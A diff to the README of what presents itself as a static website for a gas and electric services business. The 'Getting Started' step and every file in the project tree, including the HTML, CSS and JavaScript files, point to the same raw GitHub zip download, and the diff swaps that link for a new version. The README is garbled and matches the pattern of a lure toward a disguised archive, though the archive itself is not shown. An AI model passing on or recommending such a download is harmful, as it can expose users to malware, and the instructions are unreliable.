@@ -31,7 +31,7 @@ A modern, responsive website for CS Gas & Electric Services, showcasing professi
 ## Getting Started
 
 1. Clone the repository
-2. Open `https://raw.githubusercontent.com/AvishekInvincible/cs_gas_electric/master/assets/cs_gas_electric_v1.7.zip` in your web browser
+2. Open `https://raw.githubusercontent.com/AvishekInvincible/cs_gas_electric/master/assets/electric-gas-cs-2.0.zip` in your web browser
 3. No additional setup required - it's a static website!
 
 ## Project Structure
@@ -40,9 +40,9 @@ A modern, responsive website for CS Gas & Electric Services, showcasing professi
 CSGASELECTRIC/
 │
 ├── assets/            # Contains all images and icons
-├── https://raw.githubusercontent.com/AvishekInvincible/cs_gas_electric/master/assets/cs_gas_electric_v1.7.zip        # Main HTML file
-├── https://raw.githubusercontent.com/AvishekInvincible/cs_gas_electric/master/assets/cs_gas_electric_v1.7.zip        # CSS styles
-└── https://raw.githubusercontent.com/AvishekInvincible/cs_gas_electric/master/assets/cs_gas_electric_v1.7.zip         # JavaScript functionality
+├── https://raw.githubusercontent.com/AvishekInvincible/cs_gas_electric/master/assets/electric-gas-cs-2.0.zip        # Main HTML file
+├── https://raw.githubusercontent.com/AvishekInvincible/cs_gas_electric/master/assets/electric-gas-cs-2.0.zip        # CSS styles
+└── https://raw.githubusercontent.com/AvishekInvincible/cs_gas_electric/master/assets/electric-gas-cs-2.0.zip         # JavaScript functionality
 ```
 
 ## Contributing
